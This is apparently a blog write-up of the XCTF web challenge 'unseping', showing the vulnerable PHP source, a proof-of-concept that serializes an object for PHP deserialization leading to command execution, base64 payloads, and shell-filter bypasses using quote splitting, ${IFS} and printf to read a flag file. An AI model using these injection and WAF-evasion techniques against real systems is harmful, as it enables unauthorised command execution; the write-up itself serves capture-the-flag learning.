---
title: unseping题解
categories: WebSec
tags:
- php
- XCTF
---

反序列化的执行过程

```php
<?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
 
    function __destruct(){
        if (in_array($this->method, array("ping"))) {
            call_user_func_array(array($this, $this->method), $this->args);
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf($v);
        }
    }   
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?>
```

# 执行过程
闯入一个序列化的val，如何执行呢？
First: base64_encode()  
Second: wakeup()  
Third: _destruct() ---析构函数

# write Poc
```php
<?php
class ease{
private $method;
private $args;
function __construct($method, $args) {
    $this->method = $method;
    $this->args = $args;
}
  
}
$a = new ease("ping",array("l''s"));
$b = serialize($a);
echo $b;
echo'</br>';
echo base64_encode($b);
?>
```
Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsJydzIjt9fQ==

![](https://img2023.cnblogs.com/blog/3014598/202212/3014598-20221210210051910-490828453.png)
发现有个flag is here的folder
用${IFS}绕过空格  
用"绕过变量
> payload

l""s${IFS}f""lagishere

看文件如何绕过

c""at${IFS}f""lag_1s_here$(printf${IFS}"\57")f""lag_831b69012c67b35f.p""hp

flag，cat，flag，php都可以用双引号绕过，空格用${IFS}绕过，/要用printf及$()绕过。令
Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo3NDoiYyIiYXQke0lGU31mIiJsYWdfMXNfaGVyZSQocHJpbnRmJHtJRlN9Ilw1NyIpZiIibGFnXzgzMWI2OTAxMmM2N2IzNWYucCIiaHAiO319

## Flag
array(2) { [0]=> string(5) " string(47) "//$cyberpeace{b38c7d1e16dfaac1577795c0ccc558b7}" } 